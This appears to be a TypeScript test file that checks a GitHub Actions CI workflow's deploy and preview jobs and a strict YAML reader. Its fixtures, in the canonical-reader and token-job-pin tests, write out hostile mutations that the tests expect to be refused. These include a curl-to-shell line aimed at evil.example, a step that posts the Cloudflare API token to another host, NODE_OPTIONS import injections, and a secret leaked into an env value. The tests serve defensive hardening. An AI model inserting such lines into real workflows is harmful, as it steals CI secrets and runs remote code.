  test('is written in the canonical block-YAML subset', () => {
    expect(CANONICAL.get(file)!.errors).toEqual([]);
  });

  // A workflow-level env reaches every job, the token jobs among them, and none of the job checks below.
  test('has only the expected top-level keys, and names no secrets before jobs:', () => {
    const lines = code(file);
    const top = lines.slice(0, lines.indexOf('jobs:'));
    for (const line of lines.filter((line) => /^\S/.test(line))) expect(TOP_LEVEL_KEYS, line).toContain(line.split(':')[0]);
    expect(holdsSecrets(top.join('\n'))).toBe(false);
  });

  test('has only two-space job keys under jobs:, and nothing after them at the top level', () => {
    for (const line of jobLines(file)) {
      expect(line, `${file}: ${line}`).toMatch(/^ {2}/);
      if (/^ {2}\S/.test(line)) expect(line, `${file}: ${line}`).toMatch(JOB_KEY);
    }
  });
});

test('the splitter finds every job in ci.yml', () => {
  expect([...JOBS.keys()].filter((name) => name.startsWith('ci.yml:')).sort()).toEqual(
    ['deploy', 'e2e', 'preview', 'preview-build', 'preview-cleanup', 'verify'].map((name) => `ci.yml:${name}`),
  );
});

test('only the deploy and preview jobs can read a secret', () => {
  const holders = [...JOBS].filter(([, block]) => holdsSecrets(block)).map(([name]) => name);
  expect(holders.sort()).toEqual(Object.keys(TOKEN_JOBS).sort());
});

test('the jobs without the token, but verify, run where CI_LINUX_RUNNER says', () => {
  for (const [name, block] of JOBS) if (!holdsSecrets(block) && name !== 'ci.yml:verify') expect(block, name).toContain(`\n    runs-on: ${RUNNER}\n`);
});

test('verify runs on a GitHub-hosted runner, with no npm cache, whenever it uploads the artifact that deploys', () => {
  expect(job('ci.yml:verify')).toContain(`\n    runs-on: ${VERIFY_RUNNER}\n`);
  const uploads = steps(job('ci.yml:verify')).filter((step) => action(step) === 'actions/upload-artifact');
  expect(uploads).toHaveLength(1);
  // the runner expression picks ubuntu-latest for every push; the upload needs a push.
  expect(stepValue(uploads[0]!, 'if')).toBe("github.event_name == 'push' && github.ref == 'refs/heads/main'");
  // e2e on main runs on the self-hosted runner, and could save an npm cache there.
  const setupNode = steps(job('ci.yml:verify')).filter((step) => action(step) === 'actions/setup-node');
  expect(setupNode).toHaveLength(1);
  expect(mapping(setupNode[0]!, 'with', 8).get('cache')).toBe("${{ github.event_name != 'push' && 'npm' || '' }}");
  expect(mapping(setupNode[0]!, 'with', 8).get('package-manager-cache')).toBe('false');
});

test.each([
  ['ci.yml:verify', 'dist/\nbundle/'],
  ['ci.yml:preview-build', 'dist/\nbundle/'],
  ['ci.yml:e2e', 'test-results/\n.lighthouse/'],
])('%s uploads its files, hidden ones included', (name, paths) => {
  const uploads = steps(job(name)).filter((step) => action(step) === 'actions/upload-artifact');
  expect(uploads).toHaveLength(1);
  expect(mapping(uploads[0]!, 'with', 8).get('include-hidden-files')).toBe('true');
  expect(scalar(uploads[0]!, 'path', 10)).toBe(paths);
});

// The design renderer refuses without Chromium's sandbox (tools/screenshots/design.mjs). On a
// GitHub-hosted Ubuntu that restricts user namespaces, e2e installs the AppArmor profile as the
// README tells a person to, before the browser tests; a self-hosted runner is left as it is.
test('e2e lets Chromium start its sandbox on a GitHub-hosted runner, as tools/screenshots/README.md says, with its browsers where the profile looks', () => {
  const all = steps(job('ci.yml:e2e'));
  const runs = (step: string) => scalar(step, 'run', 8) ?? '';
  const at = all.findIndex((step) => runs(step).includes('playwright-chromium.apparmor'));
  const installed = all.map((step, i) => (runs(step).startsWith('npx playwright install') ? i : -1)).filter((i) => i >= 0);
  expect(installed).toHaveLength(2);
  expect(at).toBeGreaterThan(Math.max(...installed));
  expect(at).toBeLessThan(all.findIndex((step) => runs(step) === 'npm run test:e2e'));
  expect(stepValue(all[at]!, 'if')).toBe("runner.environment == 'github-hosted'");
  const script = runs(all[at]!).split('\n');
  const readme = read('tools/screenshots/README.md').split('\n').filter((line) => /^ {4}(sed|sudo) /.test(line)).map((line) => line.trim());
  expect(readme).toHaveLength(3);
  // The install narrows the tracked profile's @{HOME} to the installing account's own home.
  expect(readme[0]).toBe('sed "s|@{HOME}/|$HOME/|" tools/screenshots/playwright-chromium.apparmor | sudo tee /etc/apparmor.d/playwright-chromium >/dev/null');
  expect(script).toEqual(['if [ "$(sysctl -n kernel.apparmor_restrict_unprivileged_userns 2>/dev/null)" = 1 ]; then', ...readme.map((line) => `  ${line}`), 'fi']);
  // The profile names Playwright's default folder, so the browser must land there whatever the
  // image sets: PLAYWRIGHT_BROWSERS_PATH, set before the install, wins over XDG_CACHE_HOME.
  const browsers = all.findIndex((step) => runs(step).includes('PLAYWRIGHT_BROWSERS_PATH'));
  expect(browsers, 'a step that keeps the browsers where the profile looks').toBeGreaterThanOrEqual(0);
  expect(browsers).toBeLessThan(Math.min(...installed));
  expect(stepValue(all[browsers]!, 'if')).toBe("runner.environment == 'github-hosted'");
  expect(runs(all[browsers]!)).toBe('echo "PLAYWRIGHT_BROWSERS_PATH=$HOME/.cache/ms-playwright" >> "$GITHUB_ENV"');
  expect(read('tools/screenshots/playwright-chromium.apparmor')).toContain('profile playwright-chromium @{HOME}/.cache/ms-playwright/');
});

test.each(['ci.yml:verify', 'ci.yml:preview-build'])("%s hands on its upload's artifact ID as a job output", (name) => {
  const uploads = steps(job(name)).filter((step) => action(step) === 'actions/upload-artifact');
  expect(stepValue(uploads[0]!, 'id')).toBe('upload');
  expect([...mapping(job(name), 'outputs', 4)]).toEqual([['site-artifact-id', ARTIFACT_ID]]);
});

describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (name, expected) => {
  const block = job(name);
  const all = steps(block);
  const find = (actionName: string) => all.filter((step) => action(step) === actionName);
  const runs = all.flatMap((step) => {
    const script = scalar(step, 'run', 8);
    return script === undefined ? [] : [script];
  });
  const at = (predicate: (step: string) => boolean) => all.findIndex(predicate);
  const wranglers = find('cloudflare/wrangler-action');
  const problems = tokenJobProblems(name as keyof typeof TOKEN_JOBS, block);

  test(`runs through the ${expected.environment} environment, on a GitHub-hosted runner`, () => {
    expect(block).toContain(`\n    environment: ${expected.environment}\n`);
    // A persistent self-hosted runner keeps the tool cache and home directory that earlier jobs'
    // branch code ran beside.
    expect(block).toContain('\n    runs-on: ubuntu-latest\n');
  });

  test('installs, builds and tests nothing, and runs only the shell it must', () => {
    for (const command of ['npm ci', 'npm install', 'npm i ', 'npm run', 'npm test', 'npx ']) expect(block, command).not.toContain(command);
    const allowed = [TRUSTED_CONFIG, VERSION_CHECK, FLOOR_CHECK, ...expected.scripts];
    for (const script of runs) expect(allowed.includes(script) || NOTICE.test(script), script).toBe(true);
    for (const script of allowed) expect(runs, script).toContain(script);
  });

  // Ruling 77: an allow-list, where the test below is a deny-list.
  test('has only the job keys and step keys a token job may have', () => {
    expect(problems.keys).toEqual([]);
  });

  test("names secrets only on the HAS_CLOUDFLARE line and in wrangler-action's apiToken and accountId", () => {
    expect(problems.secrets).toEqual([]);
  });

  test('is exactly the pinned job: each step in order, by its action and SHA or its script, and every value but the names', () => {
    expect(problems.shape).toEqual([]);
  });

  test('has no container, services, strategy, shell, working-directory, defaults, outputs or continue-on-error', () => {
    expect(block).not.toMatch(/^\s*(?:- )?(container|services|strategy|shell|working-directory|defaults|outputs|continue-on-error):/m);
  });

  test('uses only pinned actions/* and cloudflare/wrangler-action, with only the inputs they need', () => {
    const uses = [...block.matchAll(/^\s*(?:- )?uses: (.*)$/gm)].map((match) => match[1]!);
    expect(uses.length).toBe(all.filter((step) => stepValue(step, 'uses')).length);
    for (const value of uses) expect(value).toMatch(PIN);
    for (const step of all.filter((step) => stepValue(step, 'uses'))) {
      const allowed = INPUTS[action(step)!];
      expect(allowed, `${action(step)} in a token job`).toBeDefined();
      for (const input of mapping(step, 'with', 8).keys()) expect(allowed, `${action(step)}: ${input}`).toContain(input);
    }
  });

  test('passes no environment but its own flags', () => {
    expect([...mapping(block, 'env', 4).keys()]).toEqual(['HAS_CLOUDFLARE']);
    for (const step of all) for (const key of mapping(step, 'env', 8).keys()) expect(STEP_ENV, key).toContain(key);
  });

  test('runs every step under the same condition, but the skip notice and (in deploy) the head check', () => {
    for (const step of all) {
      const script = scalar(step, 'run', 8);
      if (script !== undefined && NOTICE.test(script)) expect(stepValue(step, 'if')).toBe("env.HAS_CLOUDFLARE != 'true'");
      else expect(stepValue(step, 'if'), step.split('\n')[0]).toBe(stepValue(step, 'id') === 'head' ? ENABLED : expected.gate);
    }
  });

  test('checks out only the trusted files, at the trusted ref, into trusted/', () => {
    const checkouts = find('actions/checkout');
    expect(checkouts).toHaveLength(1);
    const inputs = mapping(checkouts[0]!, 'with', 8);
    expect(inputs.get('ref')).toBe(expected.ref);
    expect(inputs.get('path')).toBe('trusted');
    expect(scalar(checkouts[0]!, 'sparse-checkout', 10)?.split('\n')).toEqual(TRUSTED_FILES);
    expect(inputs.get('sparse-checkout-cone-mode')).toBe('false');
    expect(inputs.get('persist-credentials')).toBe('false');
    const setupNode = find('actions/setup-node');
    expect(setupNode).toHaveLength(1);
    expect(mapping(setupNode[0]!, 'with', 8).get('node-version-file')).toBe('trusted/.nvmrc');
    expect(mapping(setupNode[0]!, 'with', 8).get('package-manager-cache')).toBe('false');
  });

  test('refuses a custom build, and stops without a wrangler version, before wrangler runs', () => {
    const trusted = at((step) => scalar(step, 'run', 8) === TRUSTED_CONFIG);
    const check = at((step) => scalar(step, 'run', 8) === VERSION_CHECK);
    expect(trusted).toBeGreaterThan(at((step) => action(step) === 'actions/setup-node'));
    expect(at((step) => action(step) === 'actions/setup-node')).toBeGreaterThan(at((step) => action(step) === 'actions/checkout'));
    expect(stepValue(all[trusted]!, 'id')).toBe('trusted');
    expect(check).toBeGreaterThan(trusted);
    expect(mapping(all[check]!, 'env', 8).get('WRANGLER_VERSION')).toBe('${{ steps.trusted.outputs.wrangler-version }}');
    expect(wranglers.length).toBeGreaterThan(0);
    expect(all.indexOf(wranglers[0]!)).toBeGreaterThan(check);
  });

  test("stops unless the runner's npm knows the release-age floor, before wrangler runs", () => {
    const floor = at((step) => scalar(step, 'run', 8) === FLOOR_CHECK);
    expect(floor).toBeGreaterThan(at((step) => action(step) === 'actions/setup-node'));
    expect(all.indexOf(wranglers[0]!)).toBeGreaterThan(floor);
  });

  test('downloads its artifact by the ID its builder uploaded, and copies only dist/ and bundle/worker.js out of it', () => {
    const downloads = find('actions/download-artifact');
    expect(downloads).toHaveLength(expected.builder ? 1 : 0);
    if (expected.builder) {
      expect(needs(block)).toContain(expected.builder);
      expect(mapping(downloads[0]!, 'with', 8).get('artifact-ids')).toBe(`\${{ needs.${expected.builder}.outputs.site-artifact-id }}`);
      expect(mapping(downloads[0]!, 'with', 8).has('name')).toBe(false);
    }
    const downloadPaths = downloads.map((step) => mapping(step, 'with', 8).get('path') ?? '');
    expect(downloadPaths.every((path) => path.startsWith('${{ runner.temp }}/'))).toBe(true);
    const sources = runs.flatMap((script) => [...script.matchAll(/^cp (?:-R )?(\S+) \S+$/gm)].map((match) => match[1]));
    expect(sources.sort()).toEqual([...expected.copies].sort());
    for (const step of wranglers) {
      const workingDirectory = mapping(step, 'with', 8).get('workingDirectory');
      expect(workingDirectory).toBe(SITE);
      for (const path of downloadPaths) {
        expect(`${workingDirectory}/`.startsWith(`${path}/`), `${workingDirectory} is inside ${path}`).toBe(false);
        expect(`${path}/`.startsWith(`${workingDirectory}/`), `${path} is inside ${workingDirectory}`).toBe(false);
      }
    }
  });

  test('stops if the site directory holds a symlink, after the copy and before wrangler runs', () => {
    const check = at((step) => scalar(step, 'run', 8) === SYMLINK_CHECK);
    if (!expected.builder) return void expect(check).toBe(-1);
    const copy = at((step) => /^cp (?:-R )?"\$RUNNER_TEMP\/artifact\//m.test(scalar(step, 'run', 8) ?? ''));
    expect(copy).toBeGreaterThan(-1);
    expect(check).toBeGreaterThan(copy);
    expect(all.indexOf(wranglers[0]!)).toBeGreaterThan(check);
    // A copy that follows links would hide one from the check.
    for (const script of runs) expect(script, script).not.toMatch(/\bcp\b[^\n]* -[A-Za-z]*L/);
  });

  test('stops unless the artifact ID is one number, before it downloads with a download-artifact that fails on a digest mismatch', () => {
    const check = at((step) => scalar(step, 'run', 8) === ID_CHECK);
    for (const download of find('actions/download-artifact')) {
      expect(check).toBeGreaterThan(-1);
      expect(mapping(all[check]!, 'env', 8).get('ARTIFACT_ID')).toBe(mapping(download, 'with', 8).get('artifact-ids'));
      expect(all.indexOf(download)).toBeGreaterThan(check);
      expect(Number(/ # v(\d+)\./.exec(stepValue(download, 'uses') ?? '')?.[1])).toBeGreaterThanOrEqual(DOWNLOAD_MAJOR);
    }
  });

  test('runs its one wrangler command, at the trusted version, with no install scripts and a release-age floor', () => {
    expect(wranglers).toHaveLength(1);
    const inputs = mapping(wranglers[0]!, 'with', 8);
    expect(inputs.get('command')).toBe(expected.command);
    expect(inputs.get('wranglerVersion')).toBe('${{ steps.trusted.outputs.wrangler-version }}');
    expect(inputs.get('apiToken')).toBe('${{ secrets.CLOUDFLARE_API_TOKEN }}');
    expect(inputs.get('accountId')).toBe('${{ secrets.CLOUDFLARE_ACCOUNT_ID }}');
    const env = mapping(wranglers[0]!, 'env', 8);
    expect(env.get('npm_config_ignore_scripts')).toBe("'true'");
    // The same floor as Dependabot's cooldown, for the ~35 packages wrangler-action installs
    // with no lockfile.
    expect(COOLDOWN_DAYS.length).toBeGreaterThan(0);
    for (const days of COOLDOWN_DAYS) expect(env.get('npm_config_min_release_age')).toBe(`'${days}'`);
  });
});

// Sweep 20261027T190359Z, cluster 1. wrangler bundles the worker.js it is given unless its config
// says no_bundle (its preview command has no --no-bundle flag), and esbuild then follows an import in
// that file to any file on the runner. So the preview job hands wrangler only the config that
// trusted-config.mjs writes from the trusted one (tests/unit/trusted-config.test.ts holds what it
// writes, and tests/unit/preview-upload.test.ts what wrangler then uploads), and stops without it.
describe('the preview job, which uploads worker.js byte for byte', () => {
  const all = steps(job('ci.yml:preview'));
  const runAt = (script: string) => all.findIndex((step) => scalar(step, 'run', 8) === script);
  const wrangler = all.findIndex((step) => action(step) === 'cloudflare/wrangler-action');

  test('copies the site in, checks it for links, writes the config, and stops unless it was written, all before wrangler runs', () => {
    const order = [runAt(TRUSTED_CONFIG), runAt(COPY_PREVIEW_SITE), runAt(SYMLINK_CHECK), runAt(WRITE_PREVIEW_CONFIG), runAt(PREVIEW_CONFIG_CHECK), wrangler];
    expect(order.every((index) => index >= 0), String(order)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
    expect(new Set(order).size).toBe(order.length);
  });

  test('names, with --config, the file it writes and checks, and copies no config into the site', () => {
    const site = '"$RUNNER_TEMP/site/';
    const written = / (\S+)$/.exec(scalar(all[runAt(WRITE_PREVIEW_CONFIG)]!, 'run', 8)!)![1];
    const checked = /^test -f (\S+) /.exec(scalar(all[runAt(PREVIEW_CONFIG_CHECK)]!, 'run', 8)!)![1];
    const named = / --config (\S+)$/.exec(mapping(all[wrangler]!, 'with', 8).get('command')!)![1];
    expect(mapping(all[wrangler]!, 'with', 8).get('workingDirectory')).toBe(SITE);
    expect(written).toBe(`${site}${named}"`);
    expect(checked).toBe(written);
    expect(named).toMatch(/^[\w.-]+\.json$/);
    expect(job('ci.yml:preview')).not.toMatch(/\bcp\b[^\n]*wrangler\.json/);
  });
});

test.each(['ci.yml:preview-build', 'ci.yml:preview', 'ci.yml:preview-cleanup'])(
  '%s runs only when CI_PREVIEWS is true, for a pull request into the default branch',
  (name) => {
    const gate = condition(job(name));
    expect(gate).toContain("vars.CI_PREVIEWS == 'true'");
    expect(gate).toContain('github.event.pull_request.base.ref == github.event.repository.default_branch');
  },
);

// The canonical reader itself, on the spellings that would otherwise slip past the line-based checks.
describe('the canonical reader', () => {
  const errors = (text: string) => readCanonical('t.yml', text).errors;
  // Each tail below lands in step y, at eight spaces, among keys that step doesn't have yet.
  const ok =
    'name: t\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - name: x\n        run: |\n          # a shell comment\n          echo "${{ github.sha }}"\n        env:\n          A: \'b\'\n      - name: y\n';
  const NOT_A_KEY = 'not a bare `key:` or `key: value`';
  const NOT_A_VALUE = 'in place of a value';
  const MAPPING = 'must be a mapping on the lines below';
  const outside = (codePoint: string) => `${codePoint}, but a workflow holds only printable ASCII and LF`;
  // the reviewer's M1 (as CR, NEL, LS and PS), M2, M3 and N1: a YAML line break that a split on LF never sees
  const hidden = (lineBreak: string) => `        with:\n          apiToken: x\n          # note${lineBreak}          preCommands: curl -s https://evil.example | sh\n`;

  test('accepts the canonical form', () => expect(errors(ok)).toEqual([]));

  test.each([
    ['a space before the colon', ok + '        env:\n          NODE_OPTIONS : x\n', NOT_A_KEY],
    ['a quoted key', ok + '        env:\n          "NODE_OPTIONS": x\n', NOT_A_KEY],
    ['a tag on a key', ok + '        env:\n          !!str NODE_OPTIONS: x\n', NOT_A_KEY],
    ['a complex key', ok + '        with:\n          ? preCommands\n          : curl x | sh\n', NOT_A_KEY],
    ['a tagged mapping', ok + '        env: !!map\n          NODE_OPTIONS: x\n', NOT_A_VALUE],
    ['an anchor', ok + '        env: &e\n          A: b\n', NOT_A_VALUE],
    ['an alias', ok + '        env: *e\n', NOT_A_VALUE],
    ['a flow mapping', ok + '        env: { NODE_OPTIONS: x }\n', NOT_A_VALUE],
    ['an empty flow mapping', ok + '        env: {}\n', NOT_A_VALUE],
    ['a flow sequence', ok + '        needs: [a, b]\n', NOT_A_VALUE],
    ['an escape in a double-quoted value', ok + '        env:\n          X: "${{ \\x73ecrets.T }}"\n', 'a double-quoted value with a backslash'],
    ['a commented block key', ok + '        with: # note\n          preCommands: x\n', NOT_A_VALUE],
    ['a nested block indented four spaces', ok + '        with:\n            preCommands: x\n', 'a nested block not indented two spaces'],
    ['a second with in one step', ok + '        with:\n          a: b\n        with:\n          preCommands: x\n', 'a second "with" in one mapping'],
    ['a plain value carried onto a second line', ok + '        run: echo a\n          b\n', 'an indentation that matches no open block'],
    ['an indentless sequence', ok + '        needs:\n        - a\n', 'a sequence item among keys'],
    ['a block-scalar indentation indicator', ok + '        run: |2\n            echo a\n', NOT_A_VALUE],
    // Ruling 67: printable ASCII and LF only, comments and block scalars included.
    ['M1: a CR in a comment, hiding preCommands', ok + hidden('\r'), outside('U+000D (CR)')],
    ['M1: a NEL in a comment, hiding preCommands', ok + hidden('\u0085'), outside('U+0085 (NEL)')],
    ['M1: an LS in a comment, hiding preCommands', ok + hidden('\u2028'), outside('U+2028 (LS)')],
    ['M1: a PS in a comment, hiding preCommands', ok + hidden('\u2029'), outside('U+2029 (PS)')],
    ['M2: a CR in a top-level comment, hiding an env', 'name: t\n# note\renv:\r  NODE_OPTIONS: --import=data:text/javascript,0\n' + ok.slice('name: t\n'.length), outside('U+000D (CR)')],
    ['M3: a CR in a job comment, hiding a secret', ok.replace('  a:\n', '  a:\n    # note\r    env:\r      LEAK: ${{ secrets.T }}\n'), outside('U+000D (CR)')],
    ['N1: a NEL in a step name, hiding an env', ok.replace('      - name: y\n', '      - name: y\u0085        env:\u0085          NODE_OPTIONS: --import=data:text/javascript,0\n'), outside('U+0085 (NEL)')],
    ['a byte-order mark', '\uFEFF' + ok, outside('U+FEFF (BOM)')],
    ['NBSP indentation', ok + '        env:\n' + '\u00A0'.repeat(10) + 'A: b\n', outside('U+00A0 (NBSP)')],
    ['a tab for indentation', ok + '        env:\n\t  A: b\n', outside('U+0009 (tab)')],
    ['a tab in a block scalar', ok + '        run: |\n          echo a\tb\n', outside('U+0009 (tab)')],
    ['a CRLF file', ok.replaceAll('\n', '\r\n'), outside('U+000D (CR)')],
    // Ruling 68: a key that holds a mapping holds nothing else on its own line.
    ['M5: an env written as one expression', ok + `        env: \${{ fromJSON('{"NODE_OPTIONS":"--import=data:text/javascript,0"}') }}\n`, MAPPING],
    ['a with written as one expression', ok + "        with: ${{ fromJSON('{\"preCommands\":\"curl x | sh\"}') }}\n", MAPPING],
    ['secrets: inherit', ok + '        secrets: inherit\n', MAPPING],
    ['permissions: write-all', 'permissions: write-all\n' + ok, MAPPING],
    ['a block scalar for env', ok + '        env: |\n          A=b\n', MAPPING],
  ])('refuses %s', (_name, text, why) => expect(errors(text).join('\n')).toContain(why));

  test.each(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions'])(
    'refuses %s with a value on its own line',
    (key) => expect(errors(`${ok}        ${key}: \${{ fromJSON('{}') }}\n`).join('\n')).toContain(`"${key}" ${MAPPING}`),
  );
});

// The pin, on the final review's mutations of ci.yml. Each is in the canonical subset, and each
// passed every test before Ruling 77.
describe('the token-job pin', () => {
  const ci = WORKFLOWS.get('ci.yml')!;
  /** ci.yml with `old` replaced in one job's block, where it must occur exactly once. */
  const inJob = (text: string, job: string, old: string, replacement: string) => {
    const start = text.indexOf(`\n  ${job}:\n`);
    const end = start + 2 + text.slice(start + 2).search(/\n {2}\S/);
    const block = text.slice(start, end);
    expect(block.split(old), `${job}: ${old}`).toHaveLength(2);
    return text.slice(0, start) + block.replace(old, () => replacement) + text.slice(end);
  };
  const problemsOf = (text: string, name: keyof typeof TOKEN_JOBS) => {
    expect(readCanonical('ci.yml', text).errors).toEqual([]);
    return tokenJobProblems(name, jobBlocks('ci.yml', text).get(name.slice('ci.yml:'.length)) ?? '');
  };
  // deploy's steps after the head check wait for it too (AT_HEAD); the preview jobs' do not.
  const TRUSTED_STEP = `        id: trusted\n        if: ${AT_HEAD}\n`;
  const VERSION_STEP = `      - name: Stop unless a wrangler version was read\n        if: ${AT_HEAD}\n`;
  const WRANGLER = `      - if: ${AT_HEAD}\n        uses: cloudflare/wrangler-action@`;

  test('passes ci.yml as it is', () => {
    for (const name of Object.keys(TOKEN_JOBS) as (keyof typeof TOKEN_JOBS)[]) expect(problemsOf(ci, name), name).toEqual({ keys: [], secrets: [], shape: [] });
  });

  // (a) GitHub has run background steps since 2026-06-25: the job moves on without waiting, so the
  // "Stop unless" guards no longer stand before wrangler.
  test("refuses (a): background: true on deploy's trusted-config and version-check steps", () => {
    let text = inJob(ci, 'deploy', TRUSTED_STEP, `${TRUSTED_STEP}        background: true\n`);
    text = inJob(text, 'deploy', VERSION_STEP, `${VERSION_STEP}        background: true\n`);
    const { keys, shape } = problemsOf(text, 'ci.yml:deploy');
    expect(keys).toEqual(['step 5: "background" is not a key a token job\'s step may have', 'step 6: "background" is not a key a token job\'s step may have']);
    expect(shape.join('\n')).toContain('step 5: ');
  });

  test('refuses (b): a github-script step in deploy that posts the token to another host', () => {
    const step = [
      '      - name: Report the deploy',
      `        if: ${AT_HEAD}`,
      `        uses: ${TOKEN_ACTIONS.githubScript} # v9.0.0`,
      '        with:',
      '          script: |',
      "            await fetch('https://collector.example.net/', { method: 'POST', body: '${{ secrets.CLOUDFLARE_API_TOKEN }}' });",
      '',
    ].join('\n');
    const { secrets, shape } = problemsOf(inJob(ci, 'deploy', WRANGLER, step + WRANGLER), 'ci.yml:deploy');
    expect(secrets).toEqual(['step 12: with.script names secrets']);
    expect(shape).toContain('13 steps, but the pin has 12');
  });

  test('refuses (c): PREVIEW_URL set to the token, which the comment step would post on the pull request', () => {
    const { secrets, shape } = problemsOf(
      inJob(ci, 'preview', 'PREVIEW_URL: ${{ steps.preview.outputs.preview-url }}', 'PREVIEW_URL: ${{ secrets.CLOUDFLARE_API_TOKEN }}'),
      'ci.yml:preview',
    );
    expect(secrets).toEqual(['step 14: env.PREVIEW_URL names secrets']);
    expect(shape.join('\n')).toContain('step 14: ');
  });

  // Sweep 20261027T190359Z, cluster 1: each way back to a preview that wrangler bundles.
  const WRITE_STEP = `        run: ${WRITE_PREVIEW_CONFIG}\n`;
  const STOP_STEP = `      - name: Stop unless the preview's config was written\n        if: ${ENABLED}\n        run: ${PREVIEW_CONFIG_CHECK}\n`;
  const PREVIEW_COMMAND = `          command: ${TOKEN_JOBS['ci.yml:preview'].command}\n`;

  test('refuses (d): a copy of the trusted wrangler.jsonc in place of the written config', () => {
    const copied = inJob(ci, 'preview', WRITE_STEP, '        run: cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.json"\n');
    expect(problemsOf(copied, 'ci.yml:preview').shape.join('\n')).toContain('step 11: ');
    // A config copied in with the site again, and named with --config.
    let before = inJob(ci, 'preview', COPY_PREVIEW_SITE.split('\n').at(-1)!, `${COPY_PREVIEW_SITE.split('\n').at(-1)!}\n          cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"`);
    before = inJob(before, 'preview', PREVIEW_COMMAND, PREVIEW_COMMAND.replace(`--config ${PREVIEW_CONFIG_FILE}`, '--config wrangler.jsonc'));
    const { shape } = problemsOf(before, 'ci.yml:preview');
    expect(shape.join('\n')).toContain('step 9: ');
    expect(shape.join('\n')).toContain('step 13: ');
  });

  test('refuses (e): no stop before wrangler when the config is missing', () => {
    expect(problemsOf(inJob(ci, 'preview', STOP_STEP, ''), 'ci.yml:preview').shape).toContain('13 steps, but the pin has 14');
    // ... nor one that comes too late, after wrangler has run.
    const moved = inJob(inJob(ci, 'preview', STOP_STEP, ''), 'preview', '      - name: Post or update the preview comment\n', `${STOP_STEP}      - name: Post or update the preview comment\n`);
    const { shape } = problemsOf(moved, 'ci.yml:preview');
    expect(shape.join('\n')).toContain('step 12: ');
    expect(shape.join('\n')).toContain('step 13: ');
  });

  test('refuses (f): a wrangler command that names another config', () => {
    for (const config of ['wrangler.jsonc', 'trusted/wrangler.jsonc', `../site/${PREVIEW_CONFIG_FILE}`]) {
      const mutated = inJob(ci, 'preview', PREVIEW_COMMAND, PREVIEW_COMMAND.replace(`--config ${PREVIEW_CONFIG_FILE}`, `--config ${config}`));
      expect(problemsOf(mutated, 'ci.yml:preview').shape.join('\n'), config).toContain('step 13: ');
    }
    // A command with no --config at all lets wrangler look for a config beside the entry first.
    const bare = inJob(ci, 'preview', PREVIEW_COMMAND, PREVIEW_COMMAND.replace(` --config ${PREVIEW_CONFIG_FILE}`, ''));
    expect(problemsOf(bare, 'ci.yml:preview').shape.join('\n')).toContain('step 13: ');
  });

  test('refuses (g): a preview config written anywhere but the site directory, or without the mode', () => {
    for (const run of [
      WRITE_PREVIEW_CONFIG.replace('"$RUNNER_TEMP/site/', '"$RUNNER_TEMP/artifact/'),
      WRITE_PREVIEW_CONFIG.replace('--preview-config ', ''),
    ]) {
      expect(problemsOf(inJob(ci, 'preview', WRITE_STEP, `        run: ${run}\n`), 'ci.yml:preview').shape.join('\n'), run).toContain('step 11: ');
    }
  });

  // Fix round 1: the symlink check in both jobs that take an artifact, and deploy's source maps (Ruling 96).
  const SYMLINK_STEP = (gate: string) => `      - name: Stop if the site directory holds a symlink\n        if: ${gate}\n        run: ${SYMLINK_CHECK}\n`;
  const SYMLINK_RUN = `        run: ${SYMLINK_CHECK}\n`;

  test.each([
    ['ci.yml:deploy', 'deploy', AT_HEAD, '11 steps, but the pin has 12', 'step 11: ', 'step 10: '],
    ['ci.yml:preview', 'preview', ENABLED, '13 steps, but the pin has 14', 'step 10: ', 'step 9: '],
  ] as const)('refuses (h): %s without the symlink check, or with one that can pass over a link', (name, jobName, gate, fewer, checkStep, copyStep) => {
    expect(problemsOf(inJob(ci, jobName, SYMLINK_STEP(gate), ''), name).shape).toContain(fewer);
    for (const run of [
      // A search for something else.
      SYMLINK_CHECK.replace('-type l', '-type f'),
      // The form that passes when find itself fails: its output is empty, and test -z is true.
      'test -z "$(find "$RUNNER_TEMP/site" -type l)" || { echo "::error::the site directory holds a symlink"; exit 1; }',
    ]) {
      expect(problemsOf(inJob(ci, jobName, SYMLINK_RUN, `        run: ${run}\n`), name).shape.join('\n'), run).toContain(checkStep);
    }
    // A copy that follows links (cp -L) would hide one from the check, and upload its target.
    const followed = inJob(ci, jobName, '          cp -R "$RUNNER_TEMP/artifact/dist"', '          cp -RL "$RUNNER_TEMP/artifact/dist"');
    expect(problemsOf(followed, name).shape.join('\n')).toContain(copyStep);
  });

  test('refuses (i): a deploy command that leaves wrangler free to upload a source map', () => {
    const DEPLOY_COMMAND = `          command: ${TOKEN_JOBS['ci.yml:deploy'].command}\n`;
    for (const flags of ['', ' --upload-source-maps', ' --upload-source-maps=true']) {
      const mutated = inJob(ci, 'deploy', DEPLOY_COMMAND, DEPLOY_COMMAND.replace(' --upload-source-maps=false', flags));
      expect(problemsOf(mutated, 'ci.yml:deploy').shape.join('\n'), flags).toContain('step 12: ');
    }
  });
});

// ---------------------------------------------------------------------------------------------
// Sweep 20261028T105259Z, cluster 3 (Ruling 108). What production serves rested on run metadata
// that other actors can reproduce: a re-run of an older push run kept every test the deploy's gate
// made, and a dispatch run shared main's concurrency group. So deploy asks GitHub what main's head
// is now and deploys only that commit, and only main's own push runs share main's group.
// ---------------------------------------------------------------------------------------------

const MAIN_REF = 'refs/heads/main';
const CI = WORKFLOWS.get('ci.yml')!;
/** `text` with `old` replaced by `replacement`, where it must occur exactly once. */
function mutated(text: string, old: string, replacement: string): string {
  expect(text.split(old), old).toHaveLength(2);
  return text.replace(old, () => replacement);
}

type RunKind = { event_name: string; ref: string; run_id: number; pull_request?: number };
/**
 * The concurrency block's group and cancel-in-progress for one kind of run. There is no expression
 * evaluator among the dependencies, so this is a small one: each `${{ }}` in the value is checked
 * against the few characters the block uses, rewritten to the JavaScript that means the same
 * (`==` is `===`; `&&` and `||` return their operand, as GitHub's do), and run with the github
 * context and format().
 */
function concurrencyOf(text: string, run: RunKind): { group: string; cancel: string } {
  const block = /^concurrency:\n {2}group: (.*)\n {2}cancel-in-progress: (.*)\n(?=\n)/m.exec(text);
  expect(block, 'a concurrency block of exactly a group and cancel-in-progress').not.toBeNull();
  const github = { workflow: 'CI', event_name: run.event_name, ref: run.ref, run_id: run.run_id, event: { pull_request: { number: run.pull_request } } };
